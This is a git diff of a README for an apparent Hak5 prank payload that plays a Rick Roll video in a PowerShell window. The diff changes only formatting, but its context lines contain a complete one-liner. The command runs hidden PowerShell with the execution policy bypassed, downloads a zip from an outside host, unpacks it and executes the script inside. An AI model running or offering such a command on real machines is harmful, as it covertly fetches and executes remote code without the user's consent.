@@ -1,3 +1,5 @@
+---
+---
 ![Logo](https://github.com/I-Am-Jakoby/hak5-submissions/blob/main/Assets/logo-170-px.png?raw=true)
 
 <img src="https://media.giphy.com/media/VgCDAzcKvsR6OM0uWg/giphy.gif" width="50"> 
@@ -43,9 +45,9 @@ A Rick Roll video is downloaded and played in your powershell console when a mou
 
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the dependencies and payload
-```
+<pre><code>
 powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";irm -Uri 'https://jakoby.lol/qee' -O "$D\rr.zip";Expand-Archive "$D\rr.zip" -Des $D\rr -Force;. "$D\rr\rr.ps1"
-```
+</code></pre>
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
